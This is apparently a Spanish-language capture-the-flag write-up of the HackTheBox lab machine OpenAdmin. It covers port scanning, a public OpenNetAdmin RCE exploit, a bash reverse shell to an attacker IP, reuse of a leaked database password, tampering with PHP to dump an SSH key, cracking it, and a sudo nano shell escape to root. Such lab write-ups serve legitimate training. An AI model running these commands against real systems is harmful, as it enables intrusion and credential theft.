# OpenAdmin

![](../../../../~gitbook/image.md)Publicado: 04 de Junio de 2025
Autor: José Miguel Romero aKa x3m1Sec
Dificultad: ⭐ Easy
### 📝 Descripción
OpenAdmin es una máquina Linux de dificultad fácil de HackTheBox que presenta múltiples vectores de ataque web y escalada de privilegios. La explotación comienza con el descubrimiento de una instancia vulnerable de OpenNetAdmin (ONA) versión 18.1.1, que sufre de una vulnerabilidad de ejecución remota de código (RCE) a través de llamadas Ajax mal sanitizadas.La máquina requiere un enfoque metodológico que incluye:- Enumeración web exhaustiva para descubrir servicios ocultos
- Explotación de CVE público en OpenNetAdmin
- Movimiento lateral mediante reutilización de credenciales
- Análisis de configuraciones de Apache para descubrir servicios internos
- Manipulación de código PHP para bypassing de autenticación
- Cracking de claves SSH protegidas con passphrase
- Escalada de privilegios mediante abuso de permisos sudo en nano
Esta máquina es excelente para practicar técnicas de enumeración web, explotación de CVEs conocidos, y escalada de privilegios mediante binarios con permisos especiales.
### 🔭 Reconocimiento

#### Ping para verificación en base a TTL

#### Enumeración de servicios

### 🌐 Enumeración Web

#### 80 HTTP
Al acceder al puerto 80 lo único que encontramos es la pagina por defecto de un sitio web de apache en construcción:![](../../../../~gitbook/image.md)🔍Fuzzing de directoriosRelizamos fuzzing de directorios y obtenemos algunos algunos directorios importantes para analizar:![](../../../../~gitbook/image.md)![](../../../../~gitbook/image.md)![](../../../../~gitbook/image.md)En resumen, los recursos que merece analizar son:
#### 🎵 http://10.10.10.171/music/
![](../../../../~gitbook/image.md)
#### 🎨 http://10.10.10.171/artwork/index.html
![](../../../../~gitbook/image.md)
#### 📝 http://10.10.10.171/sierra/blog.html
![](../../../../~gitbook/image.md)Los tres recursos anteriores son servicios web muy similares en cuanto a construcción y tecnología, no encontramos a priori que nos conduzca a un posible vector de ataque.
#### 🎯 http://10.10.10.171/ona/
![](../../../../~gitbook/image.md)
#### 🎯 Explotación
Encontramos un servicio OpenNetAdmin. Buscando información pública encontramos que se trata de un proyecto de software libre https://github.com/opennetadmin/ona cuya función es proporcionar una herramienta IPAM (IP Address Management) para rastrear su atributos de red como nombres DNS, direcciones IP, subredes, direcciones MAC solo por nombrar algunos. A través del uso de plugins puede agregar extended it's funcionalidad.En este caso vemos que la versión es la V18.1.1.Una búsqueda rápida nos revela que existe una vulnerabilidad para dicha versión que permite explotar una RCE:![](../../../../~gitbook/image.md)La vulnerabilidad se encuentra en el uso inseguro de llamadas Ajax en el backend del sistema. En concreto, el endpoint `xajax=window_submit` acepta argumentos maliciosos que son ejecutados directamente por el sistema operativo sin una adecuada sanitización.Usaremos el siguiente exploit público:
https://github.com/amriunix/ona-rce/blob/master/ona-rce.pyVerificamos que el sistema es vulnerable:![](../../../../~gitbook/image.md)Lanzamos el exploit y ganamos acceso al host mediante la RCE:![](../../../../~gitbook/image.md)
#### Acceso Inicial -💥 Explotación RCE en OpenNetAdmin
La shell con la que accedemos es un poco limitada, por lo que vamos a mejorarla de la siguiente forma.Iniciamos un listenerDesde la shell limitada
#### 🔧 Mejora de la shell
Ahora ya podemos operar mejor. Enumeramos dos usuarios en el directorio /home a ninguno de los cuales tenemos permisos como usuario www-data:
#### 🔄 Movimiento lateral de www-data a jimmy
Comenzamos a enumerar la máquina. Encontramos credenciales de base de datos en el directorio `/opt/ona/www/local/config`Verificamos la conexión![](../../../../~gitbook/image.md)No parece gran cosa, así verificamos si alguno de los usuarios (jimmy, joanna) están reutilizando la contraseña: n1nj4W4rri0R! y confirmamos que funciona con el usuario jimmy.Sin embargo, vemos que shell actual no nos permite ejecutar determinadas operaciones, veamos si podemos usar la contraseña para conectarnos a través de SSH:Ahora ya parece funcionar el comando, aunque jimmy no pueda ejecutar nada como sudo:
#### 🔄 Movimiento lateral de jimmy a joanna
Continuamos enumerando la máquina y como sabemos que se está usando apache, revisamos en la ruta /etc/apache2/sites-enabled/ y vemos las siguientes configuraciones:Observamos que hay un servicio ejecutándose de manera local en el puerto 52846 cuyo servername es internal.openadmin.htb. Además está asignado al usuario joanna.Confirmamos con la utilidad ss que el servicio efectivamente se está ejecutando en el puerto 52846 de manera local:
#### 🔗 Port Forwarding
Vamos a realizar un redireccionamiento de este puerto a nuestro host de ataque para de esta forma acceder al servicio y ver si encontramos algo interesante.Necesitaremos también añadir la dns internal.openadmin.htb a nuestro fichero /etc/hostsAhora accedemos a http://localhost:52846/ y ya podemos enumerar el servicio
#### Tutorialspoint.com
![](../../../../~gitbook/image.md)Encontramos un panel de login y poco más. Recordemos que en la configuración de apache había un usuario asignado al servername, que es el usuario joanna. Podríamos primero probar con alguna de las contraseñas que ya tenemos o bien intentar un ataque de fuerza bruta con hydra y http-post-form aunque se me ocurre revisar otra cosa antes.Revisamos los permisos sobre el directorio /var/www/internal y vemos que jimmy tiene control absoluto sobre los ficheros de este directorio
#### 🔧 Bypass de autenticación
Si revisamos el contenido del fichero index.php vemos que hay valores harcoded para el usuario jimmy y un hash de contraseña en formato sha512 y cuando hay coincidencia, se redirecciona al fichero main.php![](../../../../~gitbook/image.md)Intentamos crackear este hash con hashcat y rockyou pero no tenemo éxito. Sin embargo, dado que tenemos control total sobre este fichero, podemos quitar esta validación o directamente hacer la comparación con la contraseña que queramos, por ejemplo:El contenido del fichero main.php verifica si se ha añadido el usuario de sesión y en caso afirmativo realiza una llamada usando la función de sistema shell_exec y un cat para imprimir el cotenido de la clave privada ssh del usuario joanna:![](../../../../~gitbook/image.md)Ahora que tenemos la clave privada de joanna, probamos a conectarnos vía ssh pero nos pide una contraseña:![](../../../../~gitbook/image.md)Podemos usar la herramienta ssh2john para generar un hash a partir de la clave privada e intentar crackear la contraseña usando john y el diccionario rockyou :![](../../../../~gitbook/image.md)Logramos autenticarnos como joanna y capturar la flag en su directorio de usuario.
#### 🚀 Escalada de Privilegios a root
Verificamos en primer lugar si joanna como ejecutar algún comando o binario como sudoEn gtfobins encontramos informacion de como abusar de este binario para escalar privilegios mediante sudo.https://gtfobins.github.io/gtfobins/nano/#sudoBásicamente lanzamos el binario como sudoy una vez en nano usamos las opciones Ctrl +R y Ctrl + X y escribimos el siguiente comando:![](../../../../~gitbook/image.md)Ahora dentro ya estamos como sudo dentro del contexto de nano y podemos obtener la flag en el directorio /root:![](../../../../~gitbook/image.md)Last updated 10 months ago- [📝 Descripción](#descripcion)
- [🔭 Reconocimiento](#reconocimiento)
- [🌐 Enumeración Web](#enumeracion-web)

```
❯  ping -c2 10.10.10.171
PING 10.10.10.171 (10.10.10.171) 56(84) bytes of data.
64 bytes from 10.10.10.171: icmp_seq=1 ttl=63 time=46.9 ms
64 bytes from 10.10.10.171: icmp_seq=2 ttl=63 time=47.6 ms

--- 10.10.10.171 ping statistics ---
2 packets transmitted, 2 received, 0% packet loss, time 1002ms
rtt min/avg/max/mdev = 46.860/47.243/47.627/0.383 ms```

> 💡 **Nota**: El TTL cercano a 64 sugiere que probablemente sea una máquina Linux.

### Escaneo de puertos TCP

```bash
ports=$(nmap -p- --min-rate=1000 -T4 10.10.10.171 | grep ^[0-9] | cut -d '/' -f1 | tr '\n' ',' | sed s/,$//)
```

```
❯ echo $ports
22,80
```

```
❯ nmap -sC -sV -p$ports 10.10.10.171 -oN services.txt
Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-04 17:16 CEST
Nmap scan report for 10.10.10.171
Host is up (0.055s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 4b:98:df:85:d1:7e:f0:3d:da:48:cd:bc:92:00:b7:54 (RSA)
|   256 dc:eb:3d:c9:44:d1:18:b1:22:b4:cf:de:bd:6c:7a:54 (ECDSA)
|_  256 dc:ad:ca:3c:11:31:5b:6f:e6:a4:89:34:7c:9b:e5:50 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.29 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

```
dirsearch -u http://10.10.10.171 -x 503
```

```
feroxbuster -u http://10.10.10.171 -r  -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt --scan-dir-listings -C 503 -x php,xml
```

```
gobuster dir -e --url 10.10.10.171 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 80
```

```
http://10.10.10.171/music
http://10.10.10.171/artwork
http://10.10.10.171/sierra
http://10.10.10.171/ona/
```

```
wget https://raw.githubusercontent.com/amriunix/ona-rce/refs/heads/master/ona-rce.py
```

```
python3 ona-rce.py check http://10.10.10.171/ona
```

```
python3 ona-rce.py exploit http://10.10.10.171/ona
```

```
nc -nlvp 443
```

```
bash -c 'bash -i >& /dev/tcp/10.10.14.3/443 0>&1'
```

```
script /dev/null -c bash
Ctrl + z
stty raw -echo; fg
reset xterm
export TERM=xterm
stty rows x columns x
```

```
www-data@openadmin:/home$ ls -la
total 16
drwxr-xr-x  4 root   root   4096 Nov 22  2019 .
drwxr-xr-x 24 root   root   4096 Aug 17  2021 ..
drwxr-x---  5 jimmy  jimmy  4096 Nov 22  2019 jimmy
drwxr-x---  5 joanna joanna 4096 Jul 27  2021 joanna
```

```
www-data@openadmin:/opt/ona/www/local/config$ cat database_settings.inc.php

array (
'databases' =>
array (
0 =>
array (
'db_type' => 'mysqli',
'db_host' => 'localhost',
'db_login' => 'ona_sys',
'db_passwd' => 'n1nj4W4rri0R!',
'db_database' => 'ona_default',
'db_debug' => false,
),
),
'description' => 'Default data context',
'context_color' => '#D3DBFF',
),
);
```

```
mysql -u ona_sys -h localhost -p ona_default
```

```
mysql> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| ona_default        |
+--------------------+
2 rows in set (0.00 sec)

mysql> use ona_default;
Database changed
mysql> show tables;
+------------------------+
| Tables_in_ona_default  |
+------------------------+
| blocks                 |
| configuration_types    |
| configurations         |
| custom_attribute_types |
| custom_attributes      |
| dcm_module_list        |
| device_types           |
| devices                |
| dhcp_failover_groups   |
| dhcp_option_entries    |
| dhcp_options           |
| dhcp_pools             |
| dhcp_server_subnets    |
| dns                    |
| dns_server_domains     |
| dns_views              |
| domains                |
| group_assignments      |
| groups                 |
| host_roles             |
| hosts                  |
| interface_clusters     |
| interfaces             |
| locations              |
| manufacturers          |
| messages               |
| models                 |
| ona_logs               |
| permission_assignments |
| permissions            |
| roles                  |
| sequences              |
| sessions               |
| subnet_types           |
| subnets                |
| sys_config             |
| tags                   |
| users                  |
| vlan_campuses          |
| vlans                  |
+------------------------+
40 rows in set (0.00 sec)

mysql> select * from users;
+----+----------+----------------------------------+-------+---------------------+---------------------+
| id | username | password                         | level | ctime               | atime               |
+----+----------+----------------------------------+-------+---------------------+---------------------+
|  1 | guest    | 098f6bcd4621d373cade4e832627b4f6 |     0 | 2025-06-04 16:23:25 | 2025-06-04 16:23:25 |
|  2 | admin    | 21232f297a57a5a743894a0e4a801fc3 |     0 | 2007-10-30 03:00:17 | 2007-12-02 22:10:26 |
+----+----------+----------------------------------+-------+---------------------+---------------------+
2 rows in set (0.00 sec)
```

```
hashcat -a 0 -m 0 21232f297a57a5a743894a0e4a801fc3  /usr/share/wordlists/rockyou.txt
```

```
jimmy@openadmin:/home$ cd jimmy
jimmy@openadmin:~$ ls -la
total 32
drwxr-x--- 5 jimmy jimmy 4096 Nov 22  2019 .
drwxr-xr-x 4 root  root  4096 Nov 22  2019 ..
lrwxrwxrwx 1 jimmy jimmy    9 Nov 21  2019 .bash_history -> /dev/null
-rw-r--r-- 1 jimmy jimmy  220 Apr  4  2018 .bash_logout
-rw-r--r-- 1 jimmy jimmy 3771 Apr  4  2018 .bashrc
drwx------ 2 jimmy jimmy 4096 Nov 21  2019 .cache
drwx------ 3 jimmy jimmy 4096 Nov 21  2019 .gnupg
drwxrwxr-x 3 jimmy jimmy 4096 Nov 22  2019 .local
-rw-r--r-- 1 jimmy jimmy  807 Apr  4  2018 .profile
jimmy@openadmin:~$ sudo -l
sudo: PERM_ROOT: setresuid(0, -1, -1): Operation not permitted
sudo: error initializing audit plugin sudoers_audit
jimmy@openadmin:~$
```

```
ssh jimmy@10.10.10.171
The authenticity of host '10.10.10.171 (10.10.10.171)' can't be established.
```

```
jimmy@openadmin:~$ sudo -l
[sudo] password for jimmy:
Sorry, user jimmy may not run sudo on openadmin.
jimmy@openadmin:~$
```

```
www-data@openadmin:/etc/apache2/sites-enabled$ ls -la
total 8
drwxr-xr-x 2 root root 4096 Nov 22  2019 .
drwxr-xr-x 8 root root 4096 Nov 21  2019 ..
lrwxrwxrwx 1 root root   32 Nov 22  2019 internal.conf -> ../sites-available/internal.conf
lrwxrwxrwx 1 root root   33 Nov 22  2019 openadmin.conf -> ../sites-available/openadmin.conf
www-data@openadmin:/etc/apache2/sites-enabled$ cat internal.conf
Listen 127.0.0.1:52846

ServerName internal.openadmin.htb
DocumentRoot /var/www/internal

AssignUserID joanna joanna

ErrorLog ${APACHE_LOG_DIR}/error.log
CustomLog ${APACHE_LOG_DIR}/access.log combined

www-data@openadmin:/etc/apache2/sites-enabled$ cat openadmin.conf

# The ServerName directive sets the request scheme, hostname and port that
# the server uses to identify itself. This is used when creating
# redirection URLs. In the context of virtual hosts, the ServerName
# specifies what hostname must appear in the request's Host: header to
# match this virtual host. For the default virtual host (this file) this
# value is not decisive as it is used as a last resort host regardless.
# However, you must set it for any further virtual host explicitly.
ServerName openadmin.htb

ServerAdmin jimmy@openadmin.htb
DocumentRoot /var/www/html

# Available loglevels: trace8, ..., trace1, debug, info, notice, warn,
# error, crit, alert, emerg.
# It is also possible to configure the loglevel for particular
# modules, e.g.
# LogLevel info ssl:warn

ErrorLog ${APACHE_LOG_DIR}/error.log
CustomLog ${APACHE_LOG_DIR}/access.log combined

# For most configuration files from conf-available/, which are
# enabled or disabled at a global level, it is possible to
# include a line for only one particular virtual host. For example the
# following line enables the CGI configuration for this host only
# after it has been globally disabled with "a2disconf".
# Include conf-available/serve-cgi-bin.conf

```

```
www-data@openadmin:/etc/apache2/sites-enabled$ ss -tulnp
Netid  State    Recv-Q   Send-Q      Local Address:Port      Peer Address:Port
udp    UNCONN   0        0           127.0.0.53%lo:53             0.0.0.0:*
tcp    LISTEN   0        128         127.0.0.53%lo:53             0.0.0.0:*
tcp    LISTEN   0        128               0.0.0.0:22             0.0.0.0:*
tcp    LISTEN   0        80              127.0.0.1:3306           0.0.0.0:*
tcp    LISTEN   0        128             127.0.0.1:52846          0.0.0.0:*
tcp    LISTEN   0        128                  [::]:22                [::]:*
tcp    LISTEN   0        128                     *:80                   *:*
```

```
ssh -L 52846:127.0.0.1:52846 jimmy@10.10.10.171
```

```
echo "10.10.10.171 internal.openadmin.htb" | sudo tee -a /etc/hosts
```

```
jimmy@openadmin:/var/www/internal$ ls -la
total 20
drwxrwx--- 2 jimmy internal 4096 Nov 23  2019 .
drwxr-xr-x 4 root  root     4096 Nov 22  2019 ..
-rwxrwxr-x 1 jimmy internal 3229 Nov 22  2019 index.php
-rwxrwxr-x 1 jimmy internal  185 Nov 23  2019 logout.php
-rwxrwxr-x 1 jimmy internal  339 Nov 23  2019 main.php
```

```

```

```
$output";
?>

Don't forget your "ninja" password
Click here to logout Session

```

```
chmod 600 id_rsa
ssh -i id_rsa joanna@10.10.10.171
```

```
ssh2john id_rsa > joanna_id_rsa.txt
```

```
john joanna_id_rsa.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

```
joanna@openadmin:~$ whoami
joanna
joanna@openadmin:~$ id
uid=1001(joanna) gid=1001(joanna) groups=1001(joanna),1002(internal)
joanna@openadmin:~$
```

```
joanna@openadmin:~$ sudo -l
Matching Defaults entries for joanna on openadmin:
env_keep+="LANG LANGUAGE LINGUAS LC_* _XKB_CHARSET", env_keep+="XAPPLRESDIR XFILESEARCHPATH XUSERFILESEARCHPATH",
secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, mail_badpass

User joanna may run the following commands on openadmin:
(ALL) NOPASSWD: /bin/nano /opt/priv
joanna@openadmin:~$
```

```
sudo /bin/nano /opt/priv
```

```
reset; sh 1>&0 2>&0
```
